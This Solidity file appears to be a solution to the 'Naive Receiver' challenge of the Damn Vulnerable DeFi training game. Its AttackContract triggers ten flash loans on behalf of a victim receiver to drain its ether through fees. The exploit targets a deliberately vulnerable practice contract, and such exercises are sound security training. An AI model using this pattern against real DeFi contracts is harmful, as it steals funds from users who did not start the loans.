// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";
import "../naive-receiver/FlashLoanReceiver.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract AttackContract {
    NaiveReceiverLenderPool private immutable pool;
    address payable receiver;

    constructor(address payable _poolAddress, address payable _receiver) {
        pool = NaiveReceiverLenderPool(_poolAddress);
        receiver = _receiver;

    }

    function attack() public {
        for(uint j = 0; j<10; j++){
            pool.flashLoan(receiver, 1 ether);
        }
    }
}